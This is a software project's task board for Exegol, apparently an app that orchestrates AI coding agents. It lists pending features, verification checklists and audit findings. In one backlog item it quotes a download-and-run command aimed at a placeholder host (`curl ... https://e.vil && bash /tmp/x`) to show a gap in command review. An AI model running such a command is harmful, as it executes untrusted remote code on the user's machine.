# Exegol — Task Board

> Audience: current contributors planning the next implementation wave after the initial MVP.
> This board is the active backlog for product differentiation, operational confidence, and release readiness.
> **Pending tasks only** — completed work lives in [`TASK_COMPLETED/`](./TASK_COMPLETED/) (monthly files) and `CHANGELOG.md` (per release).

> **Quality gate before PR**
> - `bun run lint` (pinned Biome 2.4.7, fails on warnings) and `bun run typecheck`
> - `bun run test && bun run test:shared`; CI (`.github/workflows/ci.yml`) runs the same plus `cargo test` and `bun run build`
> - Max 400-500 LOC per file unless a refactor task explicitly says otherwise

---

## Priority Order

### Plan after 0.5.14 (2026-10-04)

> Source: the 2026-10-04 backlog audit (`TASK_COMPLETED/2610.md`). User-facing and performance first.

1. ~~Status bar usage (T200.8)~~: shipped #284 (`TASK_COMPLETED/2610.md`).
2. ~~Performance pack 1~~: shipped (`perf/pack-1`): T185.8 reattach, T185.10 PR cache + focus-paused
   polls; the V8 compile cache was dropped (see `TASK_COMPLETED/2610.md`).
3. ~~Trust pack~~: shipped (`fix/trust-pack`): T200.1 trust inherited by worktrees, T200.2, T200.3,
   T183.2 for the commit message; left: T182.3 run-command review, T183.2 background opt-in.
4. ~~Performance pack 2~~: shipped (`perf/pack-2`): T185.19 main process off the hot path.
5. ~~User features, one PR each~~: shipped: ~~T200.6 answer agent questions~~ (`feat/answer-prompts`),
   ~~T200.4 queue + steer~~ (`feat/queue-steer`), ~~T200.5 undo turn~~ (`feat/undo-turn`), ~~T142 PR
   loop phase 1 (T200.7)~~ (`feat/pr-watch`, `TASK_COMPLETED/2610.md`).
6. **Daily bugs**: opencode dies across app quit (Verify live below), ~~git pane renames / MM
   files / silent failures~~ (`fix/git-pane-audit`), T138 split modes,
   T185.11 scheduler timeout, T193.2 execPath.

Then: T166 MCP recall via Ollama, T181 retention, T173, T175.4 claims TTL and UI, T144.

> **Docs to review before Wave 3 design** (merged with PR #82, pending review — Antonio 2026-08-11):
> `docs/ARCHITECTURE/COUNCIL_BASE.md` (council mode / structured executions — backs T188/T189)
> + `docs/ARCHITECTURE/OWL_FLEET_WATCH.md` (fleet watch module — backs T153 Owl phases, T188).

### Verify live (2026-09-29/30, not checked in the app)
- **opencode TUI across app quit** (reported 2026-08-11, before the two likely causes changed on
  2026-08-12: interactive CLIs now `exec` (no wrapper shell left behind) and the MCP shim
  reconnects instead of exiting when the app quits). Launch opencode, quit Exegol, reopen: the
  session should still be alive. If it dies, `exegol.log` says how. Seen then: the wrapper shell
  survived in the sidecar but opencode exited with its `Continue: opencode -s ses_…` message,
  while claude-code survived the same flow; resume_command (T101) + the session browser (T155.5)
  are the recovery path.
  **2026-10-05 investigation (`fix/opencode-across-quit`, no code fix, not reproduced):** opencode
  1.18.34 run in an isolated sidecar (built `pty-sidecar-entry.js`, temp HOME and sockets, the
  app's `zsh -i` + `exec opencode` spawn, the real shim from `opencode.json`) SURVIVED: main's
  sidecar client and the MCP server going away, the shim reconnecting to a new server, the shim
  being killed outright, a resize jiggle and focus in/out, and a replay of the query-stripped
  snapshot into `@xterm/headless` (it answers nothing). Quit kills nothing either: teardown only
  calls `disconnectSidecar()` (`index.ts` ptyHost step); `PtyHost.kill`/`terminateAll` are never
  reached on quit. What DOES kill it: one Ctrl+C (`\x03`) at an empty prompt exits opencode with
  code 0 (claude-code asks for a second one, which fits "claude survived"); and on reopen
  `bootstrap/recovery.ts` kills any live sidecar session whose agent is not `running`,
  `spawning` or `waiting_input` (`reattach-sidecar-agents.ts` query) as an orphan, SIGHUP.
  Live checklist if it happens again: (1) before quitting, note the agent's status
  (`sqlite3 ~/.exegol/exegol.db "select id,status from agents where cli_type='opencode'"`);
  (2) quit with Cmd+Q, confirm the dialog; (3) before reopening, `ps -o pid,ppid,stat,command
  -t <tty>` for the opencode pid (alive here = the app is not the killer at quit); (4) reopen and
  read `~/.exegol/logs/exegol.log` for `[Reattach]`, `Killed orphan sidecar session <id>` (status
  outside the reattach set), `Dead sidecar sessions ... <id>(exit=N/sig=N)` (died while the app
  was closed; exit 0 with no signal = it quit by itself or got a Ctrl+C) and `onExit: <id>
  (opencode)`
- Status bar: agents per CLI with their working count; Codex 5h/weekly with reset; "Show plan
  usage" turns Claude's on (keychain read, no prompt expected)
- Sidebar tree: a layout tab lists browser, launcher and both shells; a shell running `bun dev`
  shows it and pulses, at the prompt it is still; the + menu fits near the bottom
- Sidebar Projects auto order: Cmd+n ones first in key order, live ones next, then A-Z; the
  toggle switches to manual and drag works again
- Floating browser: type a URL in its address bar, DevTools, open in browser, Sizes still works
- Browser sizes: Add a size, remove it; float at a size; Sizes in the floating window (the
  others follow the first's page; design/QA off while comparing); dock back on the floated page;
  an SPA's routes do not reload a new pane; typing in a terminal while a browser redirects
- Browser: navigate in a pane, switch project and back: same page, no extra reload; device
  sizes (media queries apply, a narrow pane scrolls; design mode and QA recording still click
  the right element at a device size)
- Project layouts: save tennis's tab (browser + 2 terminals + an agent), New tab rebuilds it
  with sizes, shells and the agent (same model/YOLO); Apply here keeps panes that show something
- Installed CLIs: on a machine with few CLIs (Rigo's Linux), quick launchers show only those;
  Launch Agent's "Not installed" group, Install in a terminal, Check again after installing
- Wheel scroll in Claude after switching projects (and after an app restart) without a resize;
  multi-line paste stays one paste
- **Linux (Rigo, Fedora 44 + Kubuntu 26.04)**: agents and shells start with bash 5.3; the
  AppImage shows up in the app menu after its first launch and reopens from there; Settings >
  install CLI on the AppImage survives a restart; the .deb has its icon in the KDE menu and
  Discover shows a description, homepage and category
- Terminal repaint after a hidden tab: leave a working Claude pane in another tab for a minute,
  come back: no overlapped lines (console shows "Output overflowed while hidden" when it
  resynced)
- Startup CLI updates notice: shows once after load, Later remembers the versions, Update and
  restart waits for the install (15s checks) and then for each turn; a failed update leaves
  those sessions queued ("Restarts after the update", click to cancel)
- **Linux keys** (built on macOS, needs a Linux run): Ctrl+Shift+N/T/W/D/B/J/K/P with the cursor
  in a terminal; Ctrl+Shift+1..0 and Ctrl+Shift+Alt+1..9; Ctrl+Shift+C / Ctrl+Shift+V in a
  terminal (V relies on Chromium's own paste); Ctrl+C/D/W still reach the shell; labels in the
  tour, shortcuts list and menus say Ctrl+Shift
- Esc closes Settings and floating windows (not while a field, select or dialog has it, not from
  a focused floating terminal); Ctrl+Shift+W on Linux
- Send to: only with a selection, agents only by project, paste without Enter, cursor lands there
- Sidebar Agents / Needs attention switch; attention card in two rows; project Cmd+n badge
- Keyboard focus after Cmd+n / Cmd+Option+n; Ctrl+Tab and Cmd+] / Cmd+[ from inside a terminal
- Welcome tour (new user only), context menus near the window edges, Agents drop line, pane grip
- Browser design/QA reports to live agents
- Accessibility structural changes: tab drag/rename (incl. the drop area now spread over the
  tab's controls), sidebar rows, dashboard card clicks
- WebGL back after a terminal font change
- Projects height handle in the sidebar
- Projects view (All Projects, sidebar +, Cmd+K Go to Projects): each card's icon and colour,
  running / waiting counts move with the agents, Cmd+n badge, group chip; Back and Esc return to
  the project or Dashboard it was opened from (Esc in the Add Project dialog only closes it)
- Files peek: Esc order (unsaved-edit prompt before closing)
- Dashboard message thread on the agent card

### Manual verification pending (post-merge) `added: 2026-05-22`
- OSC 7 cwd badge on shell panes (open shell, `cd /tmp`, verify badge updates)
- OSC 133 prompt boundaries (jump-to-previous-prompt should work)
- Parallel agent comparator (spawn 2-3 agents on same task, verify columns + promote button)

### Manual verification pending — Wave 2 `added: 2026-07-05`
- Attention Inbox: TitleBar queue, Cmd+J jump, unread badges
- Knowledge tab: opt-in setup (no files written on tab open), digest refresh, MEMORY.md sync/import
- Exegol MCP read-mode denial: spawn a read-mode agent, memory_save must be refused (the rest of
  the MCP loop was verified 2026-08-11)
- Evaluator gate: template with gate step persists (zod fix), ship/retry routing works
- Oplog v2: Turn Snapshots tab lists per-step snapshots; restore refuses cross-worktree
- Race promote & clean: dirty loser prompts; live-agent loser refuses cleanup
- Monitor → Resources: eviction actually drops RSS; budget alert fires once per period

### Audit leftovers (2026-09-28), not release blockers
- Files: unsaved edits are lost on rename of the open file (keep drafts in a store; the peek and
  the Files viewer already ask before closing unsaved edits, #215)
- Watching: a card waiting for input cannot be collapsed. QA: saving a test does not refresh
  the list. Tasks: auto-detect never retries once the project loads; `.gitkeep` overwrite;
  GitHub issue cards drag to nothing
- Nits: Memory search ignores the category; prompts empty-state wording; tray "Show/Hide" label
  stale; Parallel Runs promote has no error
- Moved: hardcoded token price table to T183.1, `budgets.delete` to T144, unused `agentClis` to
  T185.16

### Platform and health tracks
- **Windows install commands, unverified**: `CLI_SETUP` has a `win` command per CLI taken from
  each vendor's docs (2026-10-01), but Exegol ships no Windows build, so none has been run.
  Before a Windows build: run each on Windows 11 (PowerShell vs cmd: `runCommandInNewTab`
  types into the user's shell), confirm `commandOnPath` finds them (PATHEXT), and that Amp
  (WSL only) shows its guide
- **Linux leftovers** (from the 2026-09-29 audit, after the first Linux build): ports
  read with `lsof` only (use `ss -ltnp` + `/proc/<pid>/cwd` when missing); the tray is invisible
  on stock GNOME (make sure no feature depends on it); rpm target for Fedora; the path guard
  covers the macOS keychain folder but not `~/.local/share/keyrings`
- **React health score (react-doctor), keep raising it**: 54 → 70 so far (#204 Bugs, #205
  Security/Performance, #209 Maintainability, Accessibility 88 → 2). Score 70; 22 findings left,
  all in the known-and-kept list (TASK_COMPLETED/2609.md). Goal 90+. Measure with
  `cd apps/desktop && npx -y react-doctor@0.9.14 . --yes --score`; the full list with `--json`.
  CI job on PRs (changed scope): errors block, warnings are listed. Known limitation: a kept
  finding re-appears as new when its lines move.
  Rule: fix the root cause, never a disable, ignore or config entry to lift the number; a
  finding that is wrong for this app stays listed and is noted in the PR (the score counts it).
  - Known and kept (not bugs here): two `autoFocus` on editors the user just opened (rename,
    diff comment), sequential loops that must stay so (queue spawns, reattach
    order, Ollama indexer, auto-resume, the concurrency helper), Monaco already lazy, the PDF
    iframe without `sandbox` (Chromium blocks its viewer), Doctor only shows install commands,
    index keys where the position is the identity, two mutations with no cached data

---

## Active Backlog

### T153 — Project Awareness Engine `added: 2026-07-04`
> Merged from T132 (automations catalog, `added: 2026-07-04`), T186 (Owl Phase 1), T187 (Owl
> Phase 2) and T159 (embedded inference backend) on 2026-10-04. T153 itself was added 2026-07-07.

**Priority**: P2 — **Wave 3 headline candidate** (do NOT start before Wave 2.6 exit criteria) | **Effort**: L (phased) | **Source**: original idea (Antonio) + design analysis 2026-07-07 + **reference implementation studies: `RESEARCH/CODEBASE_MEMORY_MCP_2026_07.md` + `RESEARCH/COCOINDEX_2026_08.md`** (adopt: two-tier mtime/hash freshness, logic fingerprint per collector, model-id in cache keys, ownership-based reconcile, macOS watcher-recreation loop, AST-derived FTS terms, source views for context packs; verdict: patterns yes, crate no) (adopt: index_coverage honesty table, FILE_CHANGES_WITH co-change drift, detect_changes hop-risk, source_hash caching, min-cosine multi-keyword recall; design spike must evaluate shelling out to the tool's CLI vs building file-level indexing in-house)

**Why**
- A lightweight per-project local worker that maintains living code memory, detects small
  health signals, and prepares context for big agents. Directly deepens the uncontested
  moat: **cross-provider shared brain** — Claude/Codex/Gemini/Aider all consume one
  project memory no first-party vendor can replicate. Local-first (code never leaves the
  machine for the awareness layer) = privacy + zero-subscription pitch.
- ~65% of the plumbing already shipped: knowledge node (T140), memory store + salience v2
  (T126), Exegol MCP server (T145), scheduler engine, resource monitor (T143),
  NotificationBus/Attention Inbox (T124/T141). Build as **evolution of
  `.exegol/knowledge/`**, never a parallel `.project-ai/` system.

**Scope — phased (trust is one-shot: 2-3 false positives kill the Health Inbox)**
- **Phase 1 — deterministic signals, NO LLM** (absorbs T132 automations catalog):
  git/fs watcher → stale TODOs (grep + git blame), branches without PR (git + gh), outdated
  deps (manifest parse), doc-mention vs manifest mismatch (e.g. README says Prisma, deps
  have Drizzle), **git co-change coupling** (codebase-memory-mcp formula: 6-month `git log
  --name-only`, skip commits >20 files, ≥3 co-changes, `score = co_count / min(a,b)`,
  threshold 0.3 → "you changed A; B co-changes 78% and wasn't touched"). Watcher = cheap
  adaptive git poll (`rev-parse HEAD` + `status --porcelain`, 5s + 1s/500 files, cap 60s)
  plus our OSC/afterCommit hooks for intra-session reaction. Deliver via NotificationBus →
  **Project Health Inbox** (severity + confidence + mandatory evidence: file/line/fragment).
  Near-100% precision before any model opines.
  - From T132: a template catalog over `scheduler/engine` ("daily summary", "scan vulns", "add
    test coverage", "triage TODOs"), each run delivered via NotificationBus (T124) with empty
    results suppressed, one-click enable from Project → Tasks. After T185.11.
  - From T186 (Owl Phase 1, kills the manual "what have I not seen?" scan across active repos):
    port the cli-proman collector commands (`status`, `git-status`, `wip`, `blocked`, `review`,
    `next`...) as deterministic per-repo collectors → facts JSON; scheduler (interval/on-wake)
    over registered repos (start: the maintainer's active repos); SQLite store with per-item
    seen/unseen marks; raw digest view in the UI. Read-only toward repos, writes only its own store.
- **Phase 2 — embedded local model**: per-file memory (purpose, exports, internal deps)
  for changed files only, 1-3 files per cycle → file_index → **context pack** injected at
  agent spawn. Schema (proven by codebase-memory-mcp): `qualified_name` stable key,
  `file_hashes(sha256, mtime_ns, size)` staleness ledger, **`index_coverage` honesty table**
  (rows for partially-indexed files — the pack never pretends completeness), **`source_hash`
  caching** for AI summaries (regenerate only on input-hash mismatch). Micro-task queue with
  budget; pause on high CPU/RAM/battery (resource monitor gates). Modes: Off / Light
  (deterministic only) / Balanced (1.7B) / Deep (4B+). Memory recall side-upgrade:
  **min-cosine multi-keyword** in `memory/store.ts` (all query terms must match, not average).
  - From T187 (Owl Phase 2): turn the collector facts into notable-or-noise + priority + 1-2 line
    summaries; seen items go quiet, unseen insist. The model only ever sees structured facts,
    never raw diffs; every digest line carries verifiable facts (SHA, PR#, timestamp). Model
    bake-off here (Qwen3 4B, SmolLM3-3B, Gemma 3 4B); `nomic-embed-text` stays embeddings-only.
  - From T159: the runtime is the `llama-server` sidecar below, not an in-process backend (T159's
    node-llama-cpp plan contradicted that decision and was dropped). Kept from it: GGUF download
    management, a single-flight queue with priorities (interactive UI > background digest), a
    ~2.5-3 GB RAM budget for 4B Q4, and backend swap as config, not rewrite.
- **Phase 3 — semantic doc↔code drift** (README says 7-day expiry, sessionConfig uses 30):
  high confidence threshold, always "suggestion" until track record accumulates,
  `needs_human_review` flag.

**MCP integration (key differentiator — extends T145 Exegol MCP server)**
- New tools on the existing token-authenticated socket: `project_context_get` (context
  pack: purpose, modules, key files, open observations, recent changes),
  `health_inbox_list` (open signals), `project_activity_recent` (bridge to `activities`/
  oplog: what agents did recently in this repo)
- Observations feed the memory store (salience/supersession applies); knowledge DIGEST.md
  refresh consumes the file_index
- External agents (any of the 14 built-in CLIs) get the shared brain mid-session, not just at spawn

**Execution architecture (decided 2026-07-07)**
- **Runtime**: llama.cpp `llama-server` binary as an **inference sidecar** (same pattern
  as the PTY sidecar: pid file, health check, on-demand spawn, idle shutdown 5-10 min
  frees RAM). NOT in-process node-llama-cpp (1-2GB weights inside Electron main + another
  napi rebuild dep). Binary ships signed in the .app (~5-10MB/arch).
- **Client**: single OpenAI-compatible abstraction, base-URL configurable — same code path
  for embedded llama-server and optional Ollama upgrade (T122's one-abstraction rule;
  `@ai-sdk/openai-compatible` if T122 lands first)
- **Structured output**: `response_format: json_schema` (GBNF grammar at decode time) —
  small model physically cannot emit invalid JSON; zod-validate on receipt anyway
- **Models** (shortlist verified 2026-07): default **Qwen3 1.7B dense Q4** (~1.2GB,
  Apache 2.0 — bundling-safe license), Deep mode **Qwen3 4B** (~2.5GB); alternates
  Phi-4-mini 3.8B (MIT), Llama 3.2. Optional via Ollama: Qwen3-Coder-Next (80B-A3B).
  Tiny embeddings model (~300MB) for file_index search.
- **Weights install**: app ships WITHOUT weights → opt-in first-activation download
  (versioned manifest, pinned SHA256, resumable, `~/.exegol/models/`) → validate via
  checksum + inference smoke test (schema-valid JSON) → Doctor (T148) check. Engine
  states: `disabled → downloading → validating → ready`; Phase 1 works with no model.

**Hard rules (from the original proposal — keep)**
- Never analyzes the whole repo at once; never modifies code; all output JSON-validated;
  every observation carries evidence; low confidence → suggestion, not alert; budgeted
  execution; per-project off switch.

**Likely files**
- New: `apps/desktop/src/main/awareness/` (watcher, task-queue, micro-tasks, inference
  sidecar client), `resources/bin/llama-server`
- Extend: `mcp/exegol-tools.ts` (+3 tools), `knowledge/*` (file_index consumer),
  `agents/spawn-context.ts` (context pack), `notifications/bus.ts` (health signals),
  `system/doctor.ts` (model check), migrations set (file_index, observations, task queue)

---

### T162 — Agent Links & Rooms `added: 2026-08-12`
**Priority**: P1 (Wave 3) | **Effort**: M (phased) | **Source**: idea (Antonio 2026-08-12) + `ARCHITECTURE/COUNCIL_BASE.md` (exchange bus) + trinity human-gate patterns + **`RESEARCH/HERDR_2026_08.md` design requirements (2026-08-12): send-and-wait atomic (event cursor captured pre-write), `delivery_not_observed` error distinct from reply timeout, replies KEYED to message id + receiver-session pinning (never satisfied by a state transition or a successor session), reads never clear the human's seen-bit**

**Why**
- "Cuando termines avisale a revisor-api" works today only if the agent remembers to call
  agent_send. A LINK makes Exegol enforce it: deterministic signals (T123) fire the notify
  at the turn boundary even when the model forgets. Rooms generalize it to multi-agent
  feedback (A builds, B+C review) — the council preset from COUNCIL_BASE.md.

Phases 1-2 (directed links + roles, `agent_link`, w3_002) shipped 2026-08-12 (PR #101), see
`TASK_COMPLETED/2609.md`. Pending from them: dashboard link UI (link icon on cards), `once:false`
recurring links live-verify.

**Remaining: Rooms.** N-agent membership; message to a room fans out (one per boundary per
member); the human sees the thread. Build on T25 messages + a room_id column. COUNCIL_BASE
exchange-bus MVP only, no headless council executions. Absorbs:
- T172.4 broadcast / shared session context (the same isolation rules written twice by hand)
- T183.6 threads survive restart: `inReplyTo` lives only on the in-memory `PendingMessage`;
  needs a `thread_id` column

**Likely files**
- `main/agents/agent-messaging.ts` (links + fanout), `mcp/exegol-{protocol,tools}.ts`
  (+agent_link), migration set wave3, dashboard card link UI, Attention/messages UI

---

### T163 — MCP Config Injection: all providers `added: 2026-08-12`
**Priority**: P1 | **Effort**: S-M | **STATUS: core SHIPPED 2026-08-12** (PR #96 stale-shim proxy + PR #97 codex/opencode/gemini injection; devin + agy wired later, `exegol-mcp-config.ts:408-425`). agy via plugins, the stale-shim gap and the Doctor wiring check are done (`TASK_COMPLETED/2610.md`, 2026-10-04 audit).

- Pending: live verify of the injected configs per provider, and the remaining CLIs: aider,
  goose, amp, kiro, kilocode, crush, factory-droid. Each gets the same shim command + per-agent
  token env, written at spawn into the agent cwd, removed/revoked on exit (config writers table:
  T191).

---

### T164 — Memory Anchors: memories addressed by the code index `added: 2026-08-12`
**Priority**: P1-P2 (Wave 3 — pairs with T153 Phase 2; anchor table can land before the full engine) | **Effort**: M | **Source**: idea (Antonio: "las memorias serían alrededor del index") + **`RESEARCH/COCOINDEX_2026_08.md`** (full design in § "Hipótesis")

**Why**
- Antonio's hypothesis, validated with inverted framing: the index is the COORDINATE SYSTEM
  memories are addressed in, not where they live. Memories get an address → staleness becomes
  mechanical (drift ≠ supersede) → recall becomes location-aware (file/symbol/call-graph/
  co-change before global RRF) — the concrete way MCP memories "get better".

**Scope (from the research doc — see it for the schema)**
1. `memory_anchor` table (anchor_kind file|symbol|range, symbol_qname, source_hash +
   snippet_fp, confidence explicit|inferred, state fresh|drifted|orphaned|relocated)
2. MCP `memory_save` accepts optional anchor (path + symbol/range resolved server-side
   against extracted declarations — NEVER trust an LLM-freehand qname); infer from
   turn-touched files when absent
3. Anchor verifier runs in the SAME sweep as index updates (two-tier mtime/hash check;
   symbol-level snippet_fp = "someone edited another function → still fresh")
4. `drifted` = recall penalty + context-pack flag; `orphaned` = suppressed, never deleted
5. Location-aware recall in context packs: anchored-to-file → referenced symbols →
   co-change neighbors → global RRF fallback

**Likely files**
- migration set wave3 (memory_anchor), `memory/store.ts` (+anchor-aware recall),
  `mcp/exegol-tools.ts` (memory_save anchor param), T153 worker (verifier), Rust core
  (declaration extractor — see cocoindex `code_ast` as reference impl)

---

### T165 — Messaging stack hardening (simplify follow-ups) `added: 2026-08-12`
**Priority**: P2 | **Effort**: M | **Source**: 4-agent /simplify over T157–T162 (2026-08-12) — correctness landed in PR #102; these are the larger/architectural residuals

- **Lifecycle event emitter**: `broadcastAgentStatus` (a transport fn) still owns delivery + link firing + `getDb()`, forcing the documented import-cycle workaround. Extract an in-main `agent:turn-ended {agentId, reason}` emitter (notifications/bus pattern) that agent-messaging subscribes to once at bootstrap; spawn-env goes back to broadcast+tray.
- MCP config writer table + wiring panel from the registry: moved to T191.
- Per-session token identity: moved to T173.
- **SessionAlias window-listener → store**: `renamingAgentId` field in the workspace/agents store instead of N window listeners.
- **mapLinkRow → zod** (agentLinkRowSchema) to match every other table's validated mapping.
- **AgentDashboard card pass-through CSS** depends on SessionAlias's internal `group/alias`
  button class: give SessionAlias a prop instead.

---

### T185 — Daily-readiness audit `added: 2026-09-22`
**Priority**: P1 unless noted | **Effort**: S-M each | **Source**: 2026-09-22 code audit + `RESEARCH/EXEGOL_REVIEW_2026_09_05.md` findings #3-#9. Items fixed in the same PR are in `TASK_COMPLETED/2609.md`.

**Dead or missing surface**
1. Scheduler UI: merged into 11 (one scheduler track).
2. **Semantic code search (indexer), kept on purpose, not usable yet** (validated 2026-09-29):
   no UI and nothing triggers `indexer.startIndexing`, so `file_index`/`file_chunks` are empty for
   everyone; only the `exegol search` CLI reads them. Before exposing it (UI, an MCP `code_search`
   tool for agents, or both): chunks are 500 lines (likely over the embedding model's context under
   Ollama defaults: truncated vectors, unverified); `semanticSearch` loads every vector of the
   project per query; its header promises FTS/RRF fusion the code does not do; `indexProject`,
   `semanticSearch`, `hybridSearch` have no tests; indexing runs on the main process. Value vs
   grep must be shown first (agents already grep). The FTS index is separate and alive (memory
   recall); its `search.*` router has no caller (only memories are indexed)
3. **Parallel runs**: `parallel-run:changed` broadcast is in neither the capabilities IPC list nor
   preload (UI polls every 10s); `agents.cancelParallelRun` has no UI. If every spawn fails the
   run stays `running` forever (was T193.17, merged 2026-10-04).
4. **Dead surface** (P2): `agent:signal` / `agent:turn-boundary` broadcasts have no subscriber;
   tables `sessions`, `port_registry`, `host_metrics` unused; `queue.*` has no UI. Wire or
   delete (feeds T144).
5. **LLM tier-3 score persists (w3_009) but nothing displays it**: show it in Scoring/History or stop
   the paid Haiku call.

**Main-process stalls**
6, 7, 9: merged into 19 (main process off the hot path).
8. **Reattach replays up to 8MB ring snapshot through `callbacks.onData`** (`pty-host.ts` ~146):
   ~100-150ms blocking per live agent at startup, and it re-fires old status/OSC signals. Write the
   snapshot to the emulator only and seed the scrollback buffer tail directly.
   > Merged from the T184 reattach-replay leftover, T185.14 rest, T184.2 rest and the
   > `COMPETITIVE_UPDATE_2026_10.md` P2 "per-session flow control" on 2026-10-04.
   - (T184 leftover) `pty-host.ts` reattach hands the sidecar's raw snapshot to the renderer; the
     other replays go through the serializer (`getLiveSnapshot`). Sending the serialized snapshot
     there too would make the sidecar's `stripTerminalQueries` unnecessary (no bump to drop it)
   - (T185.14 rest, review #9) Sidecar memory pressure: ring eviction only touches idle sessions
     (33 active rings = 264 MiB > 256 MiB target). Byte counting and the client backlog cap
     shipped 2026-10-01 (`TASK_COMPLETED/2610.md`). Bumps SIDECAR_VERSION.
   - (T184.2 rest) Queries while the app runs but no view draws the session: the sidecar answers
     DA1 only while no client is connected (app closed). With the app open, a hidden pane's xterm
     may not answer, and OSC 10/11/12 colour queries are never answered from the sidecar (T183.1
     terminal fidelity answers them in the renderer only). Needs main to tell the sidecar which
     sessions have a live view.
   - (P2) Renderer-acked, per-session flow control: `OutputGate` pauses every PTY when one socket
     backs up (terax `pty/output.rs`, klaudio 10d1e70).
10. **Polls**: GitPane / SmartGitAction / TerminalPanel poll git status + `gh pr view` every 15s;
    refetch on turn-end / commit / push events instead. The PR poll part is shared with T142.
    > Merged from the "Queue after 0.5.7" performance follow-ups (0.5.3 audit) on 2026-10-04.
    - `diff.gitState` every 15s per GitPane spawns 4 git + `gh pr view` (network): poll the PR on
      its own 2-5 min interval and invalidate after push/commit; `diff.status` repeats its git status
    - Polls keep running while the window is unfocused and hidden panes stay mounted: wire
      TanStack `focusManager` to window blur/focus and `enabled: isVisible` on pane queries
    - `FloatingBrowser` polls `agents.list` every 5s (shared key makes it win over 30s)

**From the 2026-09-05 review (reproduced there, confirmed still in code 2026-09-22)**
11. **Scheduler timeout double-records and frees capacity early** (#3): the 10-min timeout
    (`scheduler/engine.ts:277`) logs `timeout`, drops the task from `runningTasks` without stopping
    the agent, and a later finish logs `success` for the same run. Stored `maxTokenBudget` and
    `skillName` never reach spawn options; a full concurrency slot returns without a durable
    deferred run. Separate task from run; persist queue, attempt and terminal state; close each run
    once. Prerequisite for the T153 automations catalog (was T132).
    > Merged from T185.1 on 2026-10-04.
    - (was 1) **Scheduler has no UI** since 274e611 (SchedulerSection deleted); the sidebar
      Schedulers section was removed in the 2026-09-22 PR. Create/edit/toggle/run UI missing; hooks
      in `renderer/hooks/use-trpc-scheduler.ts` unused.
12. **Embeddings: a failed call leaves a permanent hole, and a model change never invalidates**
    (#4, #5): `indexProject` stores the file hash before the vector, so a `null` embedding is never
    retried; the cache compares content hash only, and `cosineSimilarity` truncates to the shorter
    dimension. Persist model id, dimension and chunker version per index generation. Before T153.
13. **Indexer ignores `.gitignore`** (#6): `walkDir` (`project-indexer.ts`) only applies its own
    exclude list. Symlinks are no longer followed (fe7e264). Use git-aware enumeration.
14. Sidecar memory pressure (rest): merged into 8.
15. **Memory salience reinforces a negation** (#7, P1 for T158/T164): `classifyObservation`
    (`salience.ts:51,61`) reinforces "Always run migrations…" with "Never run migrations…" (word
    similarity > 0.8). Auto-dedup only exact normalized matches; supersession needs an explicit
    relation, provenance and reason.

**Left from the PR simplify pass** (P2)
16. **Settings defined three times**: the `Settings` type, `settingsSchema` defaults and
    `DEFAULT_SETTINGS` drift (that is how zod stripped the Ollama keys). Make
    `Settings = z.infer<typeof settingsSchema>` and `DEFAULT_SETTINGS = settingsSchema.parse({})`;
    reconcile `agentClis` (schema `[]`, constant 4 entries) first; nothing reads it (2026-09-28
    audit nit, merged 2026-10-04).
17. **Other untyped CustomEvents**: `switch-section` is typed now (`lib/switch-section.ts`); give
    `spawn-agent` and the rest a typed `WindowEventMap` so detail keys are checked at both ends.
18. **One apply-status helper**: status dedup covers the parser path only; the other 7
    `broadcastAgentStatus` callers still write the DB and broadcast on repeats.

**Main process off the hot path** (P1, Priority Order #4)
19. ~~Everything that blocks the main thread on a polled or per-flush path~~: shipped
    (`perf/pack-2`, `TASK_COMPLETED/2610.md`). Left:
    - Search: give the Rust walker a nested-`.git` scope so a workspace is one walk instead of
      the per-folder loop (the loop now runs async on the libuv pool, 2 folders at a time)

---

### T200 — Learnings from the October competitor review `added: 2026-10-04`
**Priority**: P1 for items 1-13 | **Effort**: varies | **Source**: 48 repos (spark tag `exegol`),
two waves. Evidence, P2 and P3 items: `docs/RESEARCH/COMPETITIVE_UPDATE_2026_10.md`.

Quick ones first (S):
1. ~~Pre-trust the folder~~ shipped 2026-10-04 (a worktree / pipeline folder inherits the trust
   the user gave its project, `agents/claude-trust.ts`). Left, the per-repo half:
   > Merged from T182.3 (`added: 2026-08-19`) on 2026-10-04: **repo-authored run commands have no
   > review step.** `inspectCommand` on `.exegol/actions.yaml` is a seatbelt, not a boundary: a
   > `Makefile` target or a `package.json` script reaches the PTY without it, and even in
   > actions.yaml `curl -o /tmp/x https://e.vil && bash /tmp/x` passes. The honest fix is one
   > "this repo defines N run commands, review them" confirmation covering every source,
   > remembered per repo (one per-repo trust step together with the folder pre-trust).
11. Bundled orchestration skills on our MCP tools (paseo).
13. Send diff comments to the agent (emdash).

Then (S-M / M):
4. ~~Follow-up queue + steer~~ shipped 2026-10-04 (`feat/queue-steer`, `TASK_COMPLETED/2610.md`).
5. ~~Per-turn snapshot, "changes this turn", Undo turn (extends T129)~~: shipped on
   `feat/undo-turn` (`TASK_COMPLETED/2610.md`), Claude Code hook turns only. Left: the per-file
   history below, and turn snapshots for CLIs once they have hooks (item 9).
   > Merged from T179.2 (`added: 2026-08-13`) on 2026-10-04: **per-file local history** as a view
   > over the same snapshots. Athas keeps per-file snapshots with `reason: save | auto-save |
   > restore | manual`, content hash, size, and restore-with-diff (`local-history-api.ts`). More
   > valuable for us because AGENTS edit the files: the oplog stores git trees per operation, so
   > there is no way to open one file and see its timeline after an agent touched it.
6. ~~Answer agent questions~~ shipped 2026-10-04 for numbered prompts read from the screen
   (`feat/answer-prompts`); left: notification buttons, the hook body as a cross-check. Was:
   Answer agent questions from the Dashboard / notification (PermissionRequest hook body,
   `ask_user` MCP tool). T133 (remote channel) depends on this.
   > Merged from T171 (`added: 2026-08-13`) on 2026-10-04: **signed authorization over the agent
   > bus.** When a step genuinely needs the user, the bus has no way to carry an authorization the
   > receiver can verify (draco refused Juanito's word and stayed blocked until Antonio went to its
   > terminal by hand). An agent escalates through the channel; the user approves once from
   > Exegol (NotificationBus + Attention Inbox); the receiver gets an authorization **signed by
   > Exegol**, never relayed by the requesting agent. Pairs with T169's ownership question. A
   > human → agent send from the Dashboard thread needs a sender Exegol verifies (the removed
   > `messages.send` accepted any sender and never delivered).
7. React to PR checks, reviews and conflicts: merged into T142 on 2026-10-04.
8. Plan usage meter (5h / weekly, reset). Priority Order #1: status bar with agents per CLI,
   Claude plan usage + reset, Codex rate limits.
9. Hooks for Codex and other CLIs, session id from the hook: extends T191. Already there: codex
   `hooks.json` is merged globally by `agents/wrappers.ts`; Claude's session id from the hook
   shipped in #124.
10. Stuck-agent watchdog ladder.
    > Merged from T184.15 (`added: 2026-08-22`) on 2026-10-04: **a CLI's own journal is a
